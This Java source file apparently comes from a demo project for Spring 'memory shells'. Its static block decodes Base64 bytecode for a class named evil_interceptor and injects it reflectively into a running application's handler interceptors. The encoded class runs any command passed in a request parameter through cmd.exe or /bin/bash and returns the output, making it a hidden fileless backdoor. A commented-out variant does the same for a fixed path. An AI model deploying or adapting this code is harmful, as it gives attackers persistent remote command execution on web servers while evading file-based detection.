package com.example.springmem.demos.web;

import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.HandlerInterceptor;
import org.springframework.web.servlet.handler.AbstractHandlerMapping;
import org.springframework.web.servlet.handler.MappedInterceptor;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Base64;
import java.util.List;

/**
 * @ClassName: interceptorMem
 * @Auther: niko
 * @Date: 2024/9/30 15:50
 * @Description:
 */
public class interceptorMem {
static {
    try {
//        org.apache.catalina.core.ApplicationFilterFactory
        String bs64 = "yv66vgAAADQAmAoAIgBSCAA9CwBTAFQLAFUAVggAVwoAWABZCgALAFoIAFsKAAsAXAcAXQcAXggAXwgAYAoACgBhCABiCABjCgAKAGQKAAoAZQcAZgcAZwoAaABpCgAUAGoKABMAawoAEwBsCQBYAG0KAG4AbwoAcABvCgBwAHEKAHAAcgcAcwsAIwB0CwAjAHUHAHYHAHcHAHgBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAMkxjb20vZXhhbXBsZS9zcHJpbmdtZW0vZGVtb3Mvd2ViL2V2aWxfaW50ZXJjZXB0b3I7AQAJcHJlSGFuZGxlAQBkKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTtMamF2YS9sYW5nL09iamVjdDspWgEAAXABABpMamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyOwEABndyaXRlcgEAFUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAB3Byb2Nlc3MBABNMamF2YS9sYW5nL1Byb2Nlc3M7AQABcgEAGExqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEABnJlc3VsdAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAAdoYW5kbGVyAQASTGphdmEvbGFuZy9PYmplY3Q7AQAEY29kZQEADVN0YWNrTWFwVGFibGUHAF4HAHkHAF0HAHYHAHoHAHsHAHcHAHMBAApFeGNlcHRpb25zAQAKcG9zdEhhbmRsZQEAkihMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7TGphdmEvbGFuZy9PYmplY3Q7TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvTW9kZWxBbmRWaWV3OylWAQAMbW9kZWxBbmRWaWV3AQAuTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvTW9kZWxBbmRWaWV3OwEAD2FmdGVyQ29tcGxldGlvbgEAeShMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7TGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9FeGNlcHRpb247KVYBAAJleAEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAClNvdXJjZUZpbGUBABVldmlsX2ludGVyY2VwdG9yLmphdmEMACQAJQcAegwAfAB9BwB7DAB+AH8BAAdvcy5uYW1lBwCADACBAH0MAIIAgwEAA3dpbgwAhACFAQAYamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyAQAQamF2YS9sYW5nL1N0cmluZwEAB2NtZC5leGUBAAIvYwwAJACGAQAJL2Jpbi9iYXNoAQACLWMMAIcAiAwAiQCKAQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgEAGWphdmEvaW8vSW5wdXRTdHJlYW1SZWFkZXIHAIsMAIwAjQwAJACODAAkAI8MAJAAgwwAkQCSBwCTDACUAJUHAHkMAJYAJQwAlwAlAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwASABJDABMAE0BADBjb20vZXhhbXBsZS9zcHJpbmdtZW0vZGVtb3Mvd2ViL2V2aWxfaW50ZXJjZXB0b3IBABBqYXZhL2xhbmcvT2JqZWN0AQAyb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9IYW5kbGVySW50ZXJjZXB0b3IBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQAMZ2V0UGFyYW1ldGVyAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBABNyZWRpcmVjdEVycm9yU3RyZWFtAQAdKFopTGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcjsBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEAEyhMamF2YS9pby9SZWFkZXI7KVYBAAhyZWFkTGluZQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAFZmx1c2gBAAVjbG9zZQAhACEAIgABACMAAAAEAAEAJAAlAAEAJgAAAC8AAQABAAAABSq3AAGxAAAAAgAnAAAABgABAAAAFQAoAAAADAABAAAABQApACoAAAABACsALAACACYAAAG6AAYACgAAAK4rEgK5AAMCADoEGQTGAKAsuQAEAQA6BRIFuAAGtgAHEgi2AAmZACK7AApZBr0AC1kDEgxTWQQSDVNZBRkEU7cADjoGpwAfuwAKWQa9AAtZAxIPU1kEEhBTWQUZBFO3AA46BhkGBLYAEVcZBrYAEjoHuwATWbsAFFkZB7YAFbcAFrcAFzoIGQi2ABg6CbIAGRkJtgAaGQUZCbYAGxkFtgAcGQW2AB2nAAU6BQOsBKwAAQAPAKUAqAAeAAMAJwAAAEoAEgAAADMACgA0AA8ANgAXADgAJwA5AEYAOwBiAD0AaQA+AHAAPwCFAEAAjABBAJQAQgCbAEMAoABEAKUARgCoAEUAqgBHAKwASQAoAAAAcAALAEMAAwAtAC4ABgAXAI4ALwAwAAUAYgBDAC0ALgAGAHAANQAxADIABwCFACAAMwA0AAgAjAAZADUANgAJAAAArgApACoAAAAAAK4ANwA4AAEAAACuADkAOgACAAAArgA7ADwAAwAKAKQAPQA2AAQAPgAAACwABf0ARgcAPwcAQPwAGwcAQf8ARQAFBwBCBwBDBwBEBwBFBwA/AAEHAEYBAQBHAAAABAABAB4AAQBIAEkAAgAmAAAAYAAFAAUAAAAKKissLRkEtwAfsQAAAAIAJwAAAAoAAgAAAE4ACQBPACgAAAA0AAUAAAAKACkAKgAAAAAACgA3ADgAAQAAAAoAOQA6AAIAAAAKADsAPAADAAAACgBKAEsABABHAAAABAABAB4AAQBMAE0AAgAmAAAAYAAFAAUAAAAKKissLRkEtwAgsQAAAAIAJwAAAAoAAgAAAFMACQBUACgAAAA0AAUAAAAKACkAKgAAAAAACgA3ADgAAQAAAAoAOQA6AAIAAAAKADsAPAADAAAACgBOAE8ABABHAAAABAABAB4AAQBQAAAAAgBR";

        byte[] bytes = Base64.getDecoder().decode(bs64);
        Method method = ClassLoader.class.getDeclaredMethod("defineClass",String.class, byte[].class, int.class, int.class);
        method.setAccessible(true);
        String className = "evil_interceptor";
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        method.invoke(classLoader,className,bytes,0,bytes.length);
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        AbstractHandlerMapping abstractHandlerMapping = (AbstractHandlerMapping) context.getBean("requestMappingHandlerMapping");
        Field field = null;
        field = AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
        field.setAccessible(true);
        ArrayList<Object> o = (ArrayList<Object>) field.get(abstractHandlerMapping);
//        String[] path = new String[]{"/aaa"};
            HandlerInterceptor m = (HandlerInterceptor) classLoader.loadClass(className).newInstance();
//        MappedInterceptor mappedInterceptor = new MappedInterceptor(path, null, (HandlerInterceptor) classLoader.loadClass(className).newInstance());
        o.add(classLoader.loadClass(className).newInstance());
    } catch (Exception e) {
        e.printStackTrace();
    }
}
//    public interceptorMem() {
//
//        try {
//            String bs64 = "yv66vgAAADQAjgoAHgBOCABPCgBQAFEKAAcAUggAUwoABwBUBwBVCABWCABXCABYCwBZAFoIAFsIAFwKAF0AXgoAXQBfCgBgAGEHAGIKABEAYwgAZAoAEQBlCgARAGYKABEAZwgAaAsAaQBqBwBrCgAZAGwLAB8AbQsAHwBuBwBvBwBwBwBxAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBADJMY29tL2V4YW1wbGUvc3ByaW5nbWVtL2RlbW9zL3dlYi9ldmlsX2ludGVyY2VwdG9yOwEACXByZUhhbmRsZQEAZChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7TGphdmEvbGFuZy9PYmplY3Q7KVoBAAtpbnB1dFN0cmVhbQEAFUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAAXMBABNMamF2YS91dGlsL1NjYW5uZXI7AQAGb3V0cHV0AQASTGphdmEvbGFuZy9TdHJpbmc7AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAAdoYW5kbGVyAQASTGphdmEvbGFuZy9PYmplY3Q7AQAHY21kbGluZQEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAZvc1R5cGUBAA1TdGFja01hcFRhYmxlBwA4BwBVBwByBwBiBwBvBwBzBwB0BwBwBwBrAQAKRXhjZXB0aW9ucwEACnBvc3RIYW5kbGUBAJIoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlO0xqYXZhL2xhbmcvT2JqZWN0O0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L01vZGVsQW5kVmlldzspVgEADG1vZGVsQW5kVmlldwEALkxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L01vZGVsQW5kVmlldzsBAA9hZnRlckNvbXBsZXRpb24BAHkoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlO0xqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvRXhjZXB0aW9uOylWAQACZXgBAApTb3VyY2VGaWxlAQAVZXZpbF9pbnRlcmNlcHRvci5qYXZhDAAgACEBAAdvcy5uYW1lBwB1DAB2AHcMAHgAeQEAA3dpbgwAegB7AQAQamF2YS9sYW5nL1N0cmluZwEAB2NtZC5leGUBAAIvYwEAA2NtZAcAcwwAfAB3AQAHL2Jpbi9zaAEAAi1jBwB9DAB+AH8MAIAAgQcAggwAgwCEAQARamF2YS91dGlsL1NjYW5uZXIMACAAhQEAAlxBDACGAIcMAIgAiQwAigB5AQAABwB0DACLAIwBABNqYXZhL2xhbmcvRXhjZXB0aW9uDACNACEMAEUARgwASQBKAQAwY29tL2V4YW1wbGUvc3ByaW5nbWVtL2RlbW9zL3dlYi9ldmlsX2ludGVyY2VwdG9yAQAQamF2YS9sYW5nL09iamVjdAEAMm9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvSGFuZGxlckludGVyY2VwdG9yAQATamF2YS9pby9JbnB1dFN0cmVhbQEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QBACZqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZQEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQALdG9Mb3dlckNhc2UBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQAMZ2V0UGFyYW1ldGVyAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAAdoYXNOZXh0AQADKClaAQAEbmV4dAEAD2dldE91dHB1dFN0cmVhbQEAJSgpTGphdmF4L3NlcnZsZXQvU2VydmxldE91dHB1dFN0cmVhbTsBAA9wcmludFN0YWNrVHJhY2UAIQAdAB4AAQAfAAAABAABACAAIQABACIAAAAvAAEAAQAAAAUqtwABsQAAAAIAIwAAAAYAAQAAABMAJAAAAAwAAQAAAAUAJQAmAAAAAQAnACgAAgAiAAABhgAFAAoAAACTAToEEgK4AAM6BRkFtgAEEgW2AAaZAB8GvQAHWQMSCFNZBBIJU1kFKxIKuQALAgBTpwAcBr0AB1kDEgxTWQQSDVNZBSsSCrkACwIAUzoEuAAOGQS2AA+2ABA6BrsAEVkZBrcAEhITtgAUOgcZB7YAFZkACxkHtgAWpwAFEhc6CCy5ABgBADoJpwAKOgYZBrYAGgSsAAEACgCHAIoAGQADACMAAAAuAAsAAAAWAAMAFwAKABkATgAaAFsAGwBrABwAfwAdAIcAJACKACIAjAAjAJEAJgAkAAAAZgAKAFsALAApACoABgBrABwAKwAsAAcAfwAIAC0ALgAIAIwABQAvADAABgAAAJMAJQAmAAAAAACTADEAMgABAAAAkwAzADQAAgAAAJMANQA2AAMAAwCQADcAOAAEAAoAiQA5AC4ABQA6AAAAOQAG/QAzBwA7BwA8WAcAO/0ALgcAPQcAPkEHADz/AAwABgcAPwcAQAcAQQcAQgcAOwcAPAABBwBDBgBEAAAABAABABkAAQBFAEYAAgAiAAAAYAAFAAUAAAAKKissLRkEtwAbsQAAAAIAIwAAAAoAAgAAACsACQAsACQAAAA0AAUAAAAKACUAJgAAAAAACgAxADIAAQAAAAoAMwA0AAIAAAAKADUANgADAAAACgBHAEgABABEAAAABAABABkAAQBJAEoAAgAiAAAAYAAFAAUAAAAKKissLRkEtwAcsQAAAAIAIwAAAAoAAgAAADAACQAxACQAAAA0AAUAAAAKACUAJgAAAAAACgAxADIAAQAAAAoAMwA0AAIAAAAKADUANgADAAAACgBLADAABABEAAAABAABABkAAQBMAAAAAgBN";
//
//            byte[] bytes = Base64.getDecoder().decode(bs64);
//            Method method = ClassLoader.class.getDeclaredMethod("defineClass",String.class, byte[].class, int.class, int.class);
//            method.setAccessible(true);
//            String className = "com.example.springmem.demos.web.evil_interceptor";
//            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
//            method.invoke(classLoader,className,bytes,0,bytes.length);
//            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
//            AbstractHandlerMapping abstractHandlerMapping = (AbstractHandlerMapping) context.getBean("requestMappingHandlerMapping");
//            Field field = null;
//            field = AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
//            field.setAccessible(true);
//            ArrayList<Object> o = (ArrayList<Object>) field.get(abstractHandlerMapping);
//            String[] path = new String[]{"/aaa"};
////            HandlerInterceptor m = (HandlerInterceptor) classLoader.loadClass(className).newInstance();
//            MappedInterceptor mappedInterceptor = new MappedInterceptor(path, null, (HandlerInterceptor) classLoader.loadClass(className).newInstance());
//            o.add(mappedInterceptor);
//        } catch (Exception e) {
//            e.printStackTrace();
//        }
//
//    }
//    public Object invokeMethod(String classname,String method) throws NoSuchMethodException {
//
////        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
//////        类加载
////        Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
////        defineClass.invoke(classLoader,classname)
//        return null;
//    }

}
